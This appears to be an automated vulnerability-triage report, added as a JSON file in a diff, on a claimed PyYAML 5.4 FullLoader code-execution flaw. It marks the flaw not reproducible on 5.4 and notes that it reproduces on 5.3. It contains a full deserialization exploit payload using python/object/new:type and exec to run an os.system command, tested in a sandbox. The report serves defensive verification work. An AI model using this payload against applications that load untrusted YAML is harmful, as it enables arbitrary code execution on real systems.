@@ -1,0 +1,36 @@
+{
+  "report_id": "pyyaml-vshift-0",
+  "package": "PyYAML",
+  "affected_version": "5.4",
+  "verdict": "not_reproducible",
+  "summary": "We attempted to reproduce the reported arbitrary code execution vulnerability involving yaml.FullLoader in PyYAML 5.4. The reproduction attempt failed to replicate the claimed behavior, resulting in a NOT_REPRODUCED status. Consequently, we are marking this report as not reproducible due to the lack of a working proof-of-concept.",
+  "claims": [
+    {
+      "text": "PyYAML 5.4's FullLoader resolves the python/object/new:type tag",
+      "supported": false,
+      "evidence": "The reproduction outcome is NOT_REPRODUCED, and the captured output contains no evidence demonstrating that FullLoader resolves the python/object/new:type tag."
+    },
+    {
+      "text": "A crafted document passed to yaml.load(..., Loader=yaml.FullLoader) can construct arbitrary Python objects and execute code (os.system)",
+      "supported": false,
+      "evidence": "The reproduction outcome is NOT_REPRODUCED, and the captured output does not show any execution of arbitrary Python objects or code."
+    }
+  ],
+  "reproduction": {
+    "env_id": "pyyaml-5.4",
+    "outcome": "NOT_REPRODUCED",
+    "reproduced": false,
+    "command": "docker run --rm --network none --memory 512m --cpus 1 --pids-limit 128 -v C:\\Users\\user\\AppData\\Local\\Temp\\slopgate_poc_qjdhn9s6:/work:ro slopgate-sandbox:v1 pyyaml-5.4 /work/poc.py",
+    "stdout_tail": "SLOPGATE:NOT_REPRODUCED\n",
+    "poc": "import os, tempfile, yaml\nmarker = os.path.join(tempfile.gettempdir(), \"m\")\nif os.path.exists(marker): os.remove(marker)\npayload = ('!!python/object/new:type\\n'\n           'args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\\n'\n           'listitems: \"__import__(\\'os\\').system(\\'touch %s\\')\"\\n' % marker)\ntry:\n    yaml.load(payload, Loader=yaml.FullLoader)\nexcept Exception as e:\n    pass\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")"
+  },
+  "abstentions": [
+    "The submitted proof-of-concept does NOT reproduce on the claimed PyYAML 5.4, but the same PoC DOES reproduce on `pyyaml-5.3`. The underlying vulnerability is real on that version; confirm the intended version range before closing."
+  ],
+  "challenger_note": "",
+  "reviewer": "PENDING HUMAN REVIEW",
+  "llm_calls": 3,
+  "total_tokens": 1769,
+  "est_cost_usd": 0.0015910999999999998,
+  "wall_latency_s": 19.45
+}
